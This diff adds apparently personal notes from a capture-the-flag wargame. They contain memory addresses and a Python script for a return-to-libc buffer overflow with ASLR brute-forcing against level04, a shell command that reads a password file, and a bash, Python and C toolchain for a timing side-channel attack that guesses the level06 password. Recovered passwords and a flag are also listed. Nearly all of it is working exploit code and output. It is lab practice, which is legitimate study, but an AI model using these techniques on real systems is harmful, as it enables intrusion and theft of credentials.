@@ -1,0 +1,116 @@
+0xff842510 start of buf
+0xff84291C eip/sfp (+40C)
+0xff842920 frame (+410)
+
+0xf76xx3d0 system
+
+buf = $ebp - 408
+buf = frame - 410
+=> always starts at 4
+=> can check in increments of 1024
+
+$cmd
+0xff87efa5
+0xfff27fa5
+0xffe52fa5
+0xfffbdfa5
+0xffaedfa5
+0xffb19fa5
+0xffaaefa5
+0xffab6fa5
+
+system
+0xf75bc3d0
+0xf75c13d0
+0xf75c33d0
+0xf75b23d0
+0xf76943d0
+
+0xf7[56]XX3d0
+0xff[8-f]XXfa5
+
+0xff898794
+
+import sys, os
+
+varcmd = "/bin/cat /home/level04/.password"
+var =  "/" * (1018 - len(varcmd)) + varcmd
+cmd = "/levels/level04 " + "\"" + " " * 1036 + "\xd0\x83\x60\xf7" + "    " + "\xb6\xd0\xa5\xff" + "\""
+lim = int(sys.argv[1])
+
+for i in range(lim):
+	os.system(cmd)
+
+5: fzfDGnSmd317
+6: SF2w8qU1QDj
+
+theflagl0
+theflagl0eFTtT5oi0nOT
+
+=====================================
+#!/bin/bash
+
+prefix="$1"
+
+( for i in {a..z} {A..Z} {0..9} ; do echo "$prefix$i" ; /levels/level06 /home/the-flag/.password "$prefix$i"a 2>&1 | ./a.out | grep \\. ; done ) | python process.py
+======================================
+import sys
+import string
+import json
+import os
+
+def getline():
+	return sys.stdin.readline()[:-1]
+
+def firststr(s):
+	return string.split(s, "\t")[0]
+
+if os.path.exists("dict"):
+	f = open("dict", "r")
+	times = json.loads(f.read())
+	f.close()
+	f = open("dict", "w")
+else:
+	times = dict()
+	f = open("dict", "w")
+
+nextln = getline()
+while True:
+	letters = nextln
+	if letters == "":
+		break
+	nextln = getline()
+	stack = list()
+	while firststr(nextln).isdigit() and not nextln.isdigit():
+		stack.append(nextln)
+		nextln = getline()
+	t2 = int(firststr(stack.pop()))
+	t1 = int(firststr(stack.pop()))
+	diff = t2 - t1
+	if diff > 15:
+		value = 1
+	else:
+		value = 0
+	
+	if letters in times:
+		times[letters] += value
+	else:
+		times[letters] = value
+
+f.write(json.dumps(times))
+f.close()
+====================================
+#include <stdio.h>
+#include <sys/time.h>
+
+int main()
+{
+	char c;
+	struct timeval tv;
+	while ((c = getchar_unlocked()) != EOF) {
+		gettimeofday(&tv, NULL);
+		printf("%d\t%c\n", tv.tv_usec, c);
+	}
+	return 0;
+}
+=====================================
